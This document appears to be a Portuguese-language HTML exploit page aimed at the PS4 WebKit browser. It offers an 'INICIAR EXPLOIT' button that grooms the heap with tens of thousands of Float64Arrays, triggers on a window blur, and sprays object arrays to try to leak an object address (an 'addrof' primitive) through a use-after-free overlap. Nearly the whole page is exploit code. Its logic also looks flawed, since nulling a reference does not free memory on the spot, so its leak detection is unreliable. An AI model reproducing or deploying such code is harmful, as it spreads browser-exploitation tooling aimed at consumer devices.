
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Webkit: AddrOf Primitive Test</title>
<style>
    body { background-color: #1a1a1a; color: #ddd; font-family: 'Courier New', monospace; text-align: center; }
    h1 { color: #ffcc00; }
    .status { border: 2px solid #555; padding: 20px; margin: 20px auto; max-width: 600px; background: #222; }
    button { background: #cc0000; color: white; border: none; padding: 15px 30px; font-size: 1.2em; cursor: pointer; font-weight: bold; }
    button:hover { background: #ff0000; }
    #log { text-align: left; margin: 20px auto; max-width: 800px; white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #444; min-height: 200px;}
    .success { color: #00ff00; font-weight: bold; }
    .addr { color: #00ffff; font-weight: bold; }
</style>
</head>
<body>

<h1>PS4 UAF: AddrOf (Memory Leak) 2</h1>

<div class="status" id="msg">
    <b>INSTRUÇÕES:</b><br><br>
    1. Clique em "INICIAR EXPLIT".<br>
    2. Aperte "OPTIONS" (Menu Lateral).<br>
    3. Aguarde o resultado na tela.<br>
    4. Se falhar (nada acontecer), clique em "Atualizar".
</div>

<button onclick="fire()">INICIAR EXPLOIT</button>

<div id="log">Logs do sistema aparecerão aqui...</div>

<script>
    const Msg = document.getElementById('msg');
    const Log = document.getElementById('log');
    
    function log(txt) { 
        Log.innerHTML += txt + "\n"; 
        console.log(txt);
    }

    // Utilitário: Converte Float para representação Hexadecimal (String)
    function floatToHex(val) {
        let buf = new ArrayBuffer(8);
        let view = new DataView(buf);
        view.setFloat64(0, val, true); // Little Endian
        let hex = "0x";
        for(let i=0; i<8; i++) {
            hex += view.getUint8(7-i).toString(16).padStart(2,'0');
        }
        return hex;
    }

    // Arrays globais
    let controller_arrays = [];
    let target_arrays = [];
    const SPRAY_COUNT = 30000; // Aumentado para garantir melhor cobertura
    
    // O Objeto que queremos encontrar na memória (vazar o endereço)
    let leak_object = { 
        marker: "SEGREDOS_DO_PS4", 
        val: 1337 
    };

    function fire() {
        Msg.innerText = "Preparando Heap... (Pode levar alguns segundos)";
        log("[*] Iniciando alocação de memória...");

        // --- FASE 1: PREPARAÇÃO (GROOMING) ---
        try {
            for(let i = 0; i < SPRAY_COUNT; i++) {
                // Array Controlador: Float64Array
                // Se o UAF funcionar, ele vai ler o ponteiro do objeto como se fosse um Double.
                let ctrl = new Float64Array(16);
                ctrl[0] = i; // Marcador de índice
                controller_arrays.push(ctrl);

                // Array Alvo: Float64Array (será liberado)
                let target = new Float64Array(16);
                target.fill(1.1);
                target_arrays.push(target);
            }
        } catch(e) { log("[!] Erro na alocação: " + e); return; }

        Msg.innerText = "Memória PRONTA. Aperte OPTIONS agora!";
        log("[*] Heap Grooming completo. Aguardando evento Blur...");

        // Solicita Fullscreen
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        // --- FASE 2: GATILHO (TRIGGER) ---
        window.onblur = function() {
            log("[*] Blur detectado! Executando UAF...");
            
            // 1. FREE (Libera os arrays alvo)
            target_arrays = null; 

            // 2. SPRAY DE OBJETOS
            // Tentamos colocar arrays de objetos exatamente onde os arrays de float estavam.
            // Um Array de 16 ponteiros tem tamanho similar a um Float64Array de 16 doubles.
            let object_spray = [];
            try {
                for(let i=0; i < SPRAY_COUNT * 2; i++) {
                    // Criamos um array cheio de referências ao nosso objeto
                    let arr = new Array(16).fill(leak_object);
                    object_spray.push(arr);
                }
            } catch(e) {}

            log("[*] Spray concluído. Verificando corrupção...");

            // --- FASE 3: VERIFICAÇÃO (LEAK) ---
            let success = false;

            for(let i = 0; i < SPRAY_COUNT; i++) {
                try {
                    let val = controller_arrays[i][0];

                    // Filtro: Se o valor for muito grande (> 10000) e não for NaN
                    // Provavelmente é um ponteiro de memória e não o nosso índice 'i'
                    if (val > 10000 && !isNaN(val)) {
                        
                        let hexAddr = floatToHex(val);
                        
                        // Verifica se parece um endereço de Userland (geralmente começa com 0x0000...)
                        // Endereços muito baixos ou muito altos podem ser lixo.
                        if (hexAddr.startsWith("0x0000")) {
                            success = true;
                            document.body.style.background = "#003366"; // AZUL DE SUCESSO
                            
                            Msg.innerHTML = "<h1 style='color:#00ff00'>SUCESSO: ADDROF PRIMITIVE!</h1>";
                            
                            log("\n" + "=".repeat(40));
                            log("BINGO! VAZAMENTO DE ENDEREÇO CONFIRMADO!");
                            log("Array Controlador Index: " + i);
                            log("Valor Float lido: " + val);
                            log("Endereço do Objeto (Hex): <span class='addr'>" + hexAddr + "</span>");
                            log("=".repeat(40));
                            
                            // Parar o loop para preservar o estado
                            return;
                        }
                    }
                } catch(e) {}
            }

            if (!success) {
                log("[-] Falha: Nenhuma sobreposição válida encontrada.");
                Msg.innerText = "Falha no overlap. Tente novamente ou clique em Atualizar.";
                document.body.style.background = "#330000"; // Vermelho escuro
            }
        };
    }
</script>
</body>
</html>

